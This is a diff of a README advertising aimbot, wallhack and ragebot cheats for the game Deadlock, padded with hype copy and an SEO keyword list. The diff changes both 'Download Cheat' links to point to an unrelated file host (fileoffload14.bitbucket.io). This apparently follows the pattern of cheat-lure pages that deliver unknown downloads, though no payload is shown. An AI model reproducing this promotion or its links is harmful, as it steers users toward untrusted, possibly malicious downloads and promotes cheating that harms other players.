@@ -4,7 +4,7 @@
 
 From laser-accurate **aimbots** to full map control with **ESP wallhacks**, this cheat set gives you **total advantage** over every player. Whether you're going for subtle legit play or full rage domination, these tools turn you into the apex operator 💀.
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://wecheaters.github.io/cheats/deadlock/)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload14.bitbucket.io)
 ---
 
 ## 💣 What Is the Deadlock Cheat Pack?
@@ -13,7 +13,7 @@ This is an external tool or injected mod that works live with **Deadlock**, givi
 
 Perfect for ranked grinders, pub stompers, or anyone tired of playing fair in unfair lobbies.
 
-[![Download Cheat](https://i.ytimg.com/vi/Cb5mXavGgC8/maxresdefault.jpg)](https://wecheaters.github.io/cheats/deadlock/)
+[![Download Cheat](https://i.ytimg.com/vi/Cb5mXavGgC8/maxresdefault.jpg)](https://fileoffload14.bitbucket.io)
 ---
 
 ## 🔥 Key Features of the Deadlock Cheat
@@ -103,3 +103,4 @@ No rules. No fear. Just wins 💥
 ## 🔑 Keywords:
 
 Deadlock cheat, Deadlock aimbot, Deadlock wallhack, Deadlock ESP, Deadlock ragebot, Deadlock no recoil, Deadlock hack tool, Deadlock trainer, legit Deadlock cheat, infinite ammo Deadlock, Deadlock mod menu, Deadlock cheat UI, best cheat for Deadlock.
+
